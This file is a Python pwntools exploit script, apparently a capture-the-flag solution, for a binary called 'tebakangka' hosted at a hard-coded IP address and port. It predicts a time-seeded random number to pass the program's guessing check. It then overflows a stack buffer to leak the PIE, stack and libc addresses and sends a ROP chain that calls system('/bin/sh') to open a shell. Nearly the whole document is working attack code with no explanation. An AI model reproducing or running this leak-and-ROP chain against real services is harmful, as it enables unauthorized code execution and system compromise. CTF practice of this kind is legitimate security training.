#!/usr/bin/env python3
from pwn import *
import ctypes
import time

# =========================================================
#                          SETUP                         
# =========================================================
exe = './tebakangka'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc6_2.35-0ubuntu3.1_amd64'
libc = ELF(libc, checksec=False)
lib = '/lib/x86_64-linux-gnu/libc.so.6'
lib = ctypes.CDLL(lib)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '206.189.32.77', 9502

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# breakrva 0x135f
# breakrva 0x140b
# breakrva 0x149e
breakrva 0x14e5
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec tebakangka
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      PIE enabled

def gen_random():
    lib.srand(lib.time(None))
    rand = lib.rand()
    rdx = rand
    rand = (rand << 3) + rdx & 0xffffffff
    rdx = ctypes.c_int(rand).value
    rdx = ctypes.c_ulong(rdx * -0x6c503075).value >> 0x20
    rdx = ctypes.c_uint(rdx + rand).value >> 0xb
    ecx = rand >> 0x1f
    rdx = rdx - ecx
    ecx = rdx * 0xdde
    rand = rand - ecx
    return rand

stack = 0x0
one_gadgets = [0xebc81, 0xebc85, 0xebc88, 0xebce2, 0xebd38, 0xebd3f, 0xebd43]
def exploit():
    global io
    io = initialize()

    io.sendlineafter(b'):', b'1')

    rand = gen_random()
    io.sendlineafter(b'angka', str(rand).encode())

    payload = b'A' * 263 + b'B' + b'\xb4'
    io.sendafter(b'biasanya?', payload)
    io.recvuntil(b'AB')
    elf.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x15b4

    ADD_RSP_RET = elf.address + 0x1016
    BOF_FUNCTION = elf.address + 0x1458
    RET = elf.address + 0x101a

    payload = flat({
        264: [
            elf.plt['puts'],
            BOF_FUNCTION,
            RET,
            BOF_FUNCTION
        ]
    })
    io.sendafter(b'biasanya?', payload)
    io.recvuntil(b'makanmu\n')
    stack = u64(io.recv(6).ljust(8, b'\x00'))

    io.sendafter(b'biasanya?', b'A'*(0x60-1) + b'B')
    io.recvuntil(b'AB')
    libc.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x8ca61

    rop = ROP(libc)
    payload = flat({
        256: [
            stack,  
            rop.find_gadget(['pop rdi', 'ret'])[0],
            next(libc.search(b'/bin/sh\x00')),
            RET,
            libc.sym['system']
        ]
    })
    io.sendafter(b'biasanya?', payload)

    log.success('elf base: %#x', elf.address)
    log.success('libc base: %#x', libc.address)
    log.success('stack: %#x', stack)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
